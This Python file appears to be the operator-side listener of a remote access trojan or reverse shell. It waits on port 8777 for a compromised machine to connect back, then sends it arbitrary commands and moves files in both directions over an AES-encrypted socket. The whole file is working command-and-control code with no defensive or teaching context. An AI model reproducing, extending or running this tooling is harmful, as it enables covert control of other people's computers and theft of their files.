import socket
import base64
from Encryptor import AES_Encryption
import traceback
import os


class bcolors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    WHITE = '\033[37m'


class Listener:
    def __init__(self, ip, port):
        os.system("chcp 65001")
        self.key = "pass"
        self.iv = "initialization vector"
        self.cipher = AES_Encryption(key=self.key, iv=self.iv)
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(1)
        print(bcolors.GREEN + bcolors.BOLD)
        print("[+] Waiting for incoming connnections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))
        print(bcolors.WHITE + bcolors.BOLD)

    def encrypt_stuff(self, data):
        return self.cipher.encrypt(data)

    def decrypt_stuff(self, data):
        return self.cipher.decrypt(data)

    def execute_remotely(self, data):
        self.reliable_send(data)
        if data == 'exit':
            self.connection.close()
            print("Connection Closed")
            exit(0)
        return self.reliable_receive()

    def reliable_send(self, data):
        encrypted_data = self.cipher.encrypt(data)
        data_length = len(encrypted_data)
        self.connection.send(self.cipher.encrypt(str(data_length)))
        self.connection.send(encrypted_data)

    def reliable_receive(self):
        data_length_encrypted = self.connection.recv(1024)
        data_length = self.decrypt_stuff(data_length_encrypted)
        encrypted_data = self.connection.recv(int(data_length))

        decrypted_data = self.decrypt_stuff(encrypted_data)

        return decrypted_data

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return ("[+] Download successful")

    def read_file(self, path):
        with open(path, "rb") as file:
            data = file.read()
            string_base64_data = base64.b64encode(data).decode('ascii')
            return string_base64_data

    def run(self):
        while True:
            command = input(">> ")
            while not (command and command.strip()):
                command = input(">> ")
            try:


                if command[0:6] == "upload":

                    file_content = self.read_file(command[7:])

                    command = command + " " + file_content

                    result = self.execute_remotely(command)
                else:
                    result = self.execute_remotely(base64.b64encode(bytes(command, "utf-8")).decode())
                    try:
                        result = base64.b64decode(result).decode("utf-8")
                    except:
                        pass

                if command[0:8] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[9:], result)
            except Exception as e:
                print(bcolors.RED + bcolors.BOLD)
                result = "[-] Error during command execution. in Server " + str(e)
                print(bcolors.WHITE + bcolors.BOLD)
                print(traceback.format_exc())

            print(result)


while True:
    try:
        listener = Listener("0.0.0.0", 8777)
        listener.run()
    except:
        continue
